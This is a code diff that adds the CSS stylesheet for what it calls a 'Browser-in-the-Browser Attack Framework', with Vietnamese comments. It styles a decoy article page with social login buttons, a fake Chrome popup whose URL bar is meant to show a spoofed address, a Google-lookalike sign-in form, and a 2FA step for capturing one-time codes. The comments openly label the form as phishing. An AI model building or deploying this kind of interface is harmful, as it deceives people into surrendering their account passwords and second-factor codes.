@@ -1,0 +1,464 @@
+/**
+ * Browser-in-the-Browser (BitB) Attack Framework
+ * CSS — Mô phỏng cửa sổ popup trình duyệt Chrome
+ */
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #1a1a2e;
+    min-height: 100vh;
+    overflow-x: hidden;
+}
+
+/* ===== HOST PAGE — Trang chủ giả ===== */
+.host-page {
+    max-width: 640px;
+    margin: 0 auto;
+    padding: 0;
+    background: #fff;
+    min-height: 100vh;
+}
+
+.host-header {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    padding: 20px 16px;
+    text-align: center;
+    color: white;
+}
+.host-header h1 {
+    font-size: 18px;
+    font-weight: 700;
+    margin-bottom: 4px;
+}
+.host-header p {
+    font-size: 12px;
+    opacity: 0.85;
+}
+
+.host-article {
+    padding: 20px 16px;
+}
+.host-article h2 {
+    font-size: 20px;
+    font-weight: 800;
+    color: #1a1a2e;
+    margin-bottom: 12px;
+    line-height: 1.4;
+}
+.host-article .article-meta {
+    font-size: 11px;
+    color: #999;
+    margin-bottom: 16px;
+    display: flex;
+    gap: 12px;
+}
+.host-article .article-img {
+    width: 100%;
+    height: 200px;
+    background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+    border-radius: 12px;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 64px;
+}
+.host-article .article-body {
+    font-size: 14px;
+    color: #333;
+    line-height: 1.8;
+    margin-bottom: 20px;
+}
+.host-article .article-body strong {
+    color: #1a73e8;
+}
+
+/* Social login buttons */
+.social-login-section {
+    background: #f8f9fa;
+    border-radius: 12px;
+    padding: 20px;
+    margin: 20px 0;
+    text-align: center;
+}
+.social-login-section h3 {
+    font-size: 14px;
+    font-weight: 700;
+    color: #333;
+    margin-bottom: 6px;
+}
+.social-login-section p {
+    font-size: 12px;
+    color: #666;
+    margin-bottom: 16px;
+}
+
+.btn-social {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    width: 100%;
+    padding: 12px 16px;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    border: none;
+    margin-bottom: 10px;
+    transition: transform 0.1s, box-shadow 0.2s;
+}
+.btn-social:active { transform: scale(0.98); }
+.btn-social svg { flex-shrink: 0; }
+
+.btn-google {
+    background: white;
+    color: #3c4043;
+    border: 1px solid #dadce0;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+}
+.btn-google:hover { box-shadow: 0 2px 8px rgba(0,0,0,0.12); }
+
+.btn-facebook {
+    background: #1877f2;
+    color: white;
+    box-shadow: 0 2px 8px rgba(24,119,242,0.3);
+}
+
+/* ===== BitB POPUP WINDOW ===== */
+.bitb-overlay {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.55);
+    z-index: 9999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    animation: bitbFadeIn 0.25s ease;
+    backdrop-filter: blur(2px);
+    -webkit-backdrop-filter: blur(2px);
+}
+
+@keyframes bitbFadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+@keyframes bitbSlideUp {
+    from { opacity: 0; transform: translateY(30px) scale(0.95); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+}
+
+.bitb-window {
+    width: 94%;
+    max-width: 420px;
+    background: #fff;
+    border-radius: 10px;
+    overflow: hidden;
+    box-shadow: 0 25px 80px rgba(0,0,0,0.5), 0 0 0 1px rgba(0,0,0,0.1);
+    animation: bitbSlideUp 0.3s ease;
+}
+
+/* Title bar — giống Chrome */
+.bitb-titlebar {
+    background: #dee1e6;
+    padding: 8px 10px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    user-select: none;
+    -webkit-user-select: none;
+}
+
+.bitb-dots {
+    display: flex;
+    gap: 6px;
+    flex-shrink: 0;
+}
+.bitb-dots span {
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+}
+.bitb-dots span:nth-child(1) { background: #ff5f57; }
+.bitb-dots span:nth-child(2) { background: #febc2e; }
+.bitb-dots span:nth-child(3) { background: #28c840; }
+
+/* URL bar — phần quan trọng nhất: hiển thị URL giả */
+.bitb-urlbar {
+    flex: 1;
+    background: white;
+    border-radius: 20px;
+    padding: 5px 12px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 12px;
+    color: #5f6368;
+    border: 1px solid #c8cad0;
+    overflow: hidden;
+    white-space: nowrap;
+}
+.bitb-lock {
+    color: #188038;
+    font-size: 13px;
+    flex-shrink: 0;
+}
+.bitb-url-text {
+    color: #202124;
+    font-size: 12px;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+.bitb-url-text .domain {
+    color: #202124;
+    font-weight: 500;
+}
+.bitb-url-text .path {
+    color: #5f6368;
+}
+
+.bitb-close {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    color: #5f6368;
+    flex-shrink: 0;
+    transition: background 0.15s;
+}
+.bitb-close:hover {
+    background: rgba(0,0,0,0.08);
+}
+
+/* Content area — chứa form phishing */
+.bitb-content {
+    padding: 0;
+    max-height: 75vh;
+    overflow-y: auto;
+}
+
+/* Google login form bên trong BitB */
+.bitb-google-form {
+    padding: 32px 28px;
+    text-align: center;
+}
+.bitb-google-form .g-logo {
+    margin-bottom: 16px;
+}
+.bitb-google-form h2 {
+    font-family: 'Google Sans', 'Segoe UI', sans-serif;
+    font-size: 22px;
+    font-weight: 400;
+    color: #202124;
+    margin-bottom: 4px;
+}
+.bitb-google-form .g-subtitle {
+    font-size: 14px;
+    color: #5f6368;
+    margin-bottom: 24px;
+}
+.bitb-google-form .g-input-group {
+    position: relative;
+    margin-bottom: 16px;
+    text-align: left;
+}
+.bitb-google-form .g-input {
+    width: 100%;
+    padding: 14px 14px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    font-size: 16px;
+    color: #202124;
+    outline: none;
+    transition: border-color 0.2s;
+}
+.bitb-google-form .g-input:focus {
+    border-color: #1a73e8;
+    border-width: 2px;
+    padding: 13px 13px;
+}
+.bitb-google-form .g-input-label {
+    position: absolute;
+    top: -8px;
+    left: 10px;
+    background: white;
+    padding: 0 4px;
+    font-size: 11px;
+    color: #5f6368;
+    display: none;
+}
+.bitb-google-form .g-input:focus + .g-input-label,
+.bitb-google-form .g-input:not(:placeholder-shown) + .g-input-label {
+    display: block;
+    color: #1a73e8;
+}
+
+.bitb-google-form .g-error {
+    background: #fce8e6;
+    border: 1px solid #f5c6cb;
+    border-radius: 4px;
+    padding: 10px 12px;
+    margin-bottom: 14px;
+    font-size: 12px;
+    color: #c5221f;
+    display: none;
+    text-align: left;
+}
+.bitb-google-form .g-error.show { display: block; }
+
+.bitb-google-form .g-actions {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 24px;
+}
+.bitb-google-form .g-link {
+    color: #1a73e8;
+    font-size: 13px;
+    font-weight: 500;
+    text-decoration: none;
+    cursor: pointer;
+}
+.bitb-google-form .g-btn {
+    padding: 10px 24px;
+    background: #1a73e8;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background 0.2s, box-shadow 0.2s;
+}
+.bitb-google-form .g-btn:hover {
+    background: #1765cc;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+}
+.bitb-google-form .g-btn:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+}
+
+/* User chip */
+.bitb-user-chip {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: #f1f3f4;
+    border-radius: 16px;
+    padding: 4px 12px 4px 4px;
+    margin-bottom: 16px;
+    font-size: 13px;
+    color: #3c4043;
+    cursor: pointer;
+}
+.bitb-user-chip svg { flex-shrink: 0; }
+
+/* Show password */
+.bitb-show-pw {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-top: 4px;
+    font-size: 13px;
+    color: #3c4043;
+}
+.bitb-show-pw input { cursor: pointer; }
+
+/* Footer */
+.bitb-footer {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 16px 28px;
+    border-top: 1px solid #f0f0f0;
+    font-size: 12px;
+    color: #5f6368;
+}
+.bitb-footer a {
+    color: #5f6368;
+    text-decoration: none;
+}
+
+/* Loading */
+.bitb-loading {
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(255,255,255,0.9);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 10;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s;
+}
+.bitb-loading.active {
+    opacity: 1;
+    pointer-events: all;
+}
+.bitb-spinner {
+    width: 36px; height: 36px;
+    border: 3px solid #e8eaed;
+    border-top-color: #1a73e8;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.bitb-loading p {
+    margin-top: 12px;
+    font-size: 13px;
+    color: #5f6368;
+}
+
+/* 2FA step */
+.bitb-2fa {
+    text-align: center;
+    padding: 24px 28px;
+}
+.bitb-2fa .phone-icon {
+    font-size: 48px;
+    margin-bottom: 12px;
+}
+.bitb-2fa p {
+    font-size: 14px;
+    color: #3c4043;
+    line-height: 1.5;
+    margin-bottom: 20px;
+}
+.bitb-2fa .otp-input {
+    width: 180px;
+    padding: 12px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    font-size: 22px;
+    text-align: center;
+    letter-spacing: 8px;
+    font-weight: 600;
+    color: #202124;
+    outline: none;
+    margin: 0 auto 20px;
+    display: block;
+}
+.bitb-2fa .otp-input:focus {
+    border-color: #1a73e8;
+    border-width: 2px;
+}
+
+/* Host page footer */
+.host-footer {
+    padding: 16px;
+    text-align: center;
+    font-size: 11px;
+    color: #999;
+    border-top: 1px solid #eee;
+}
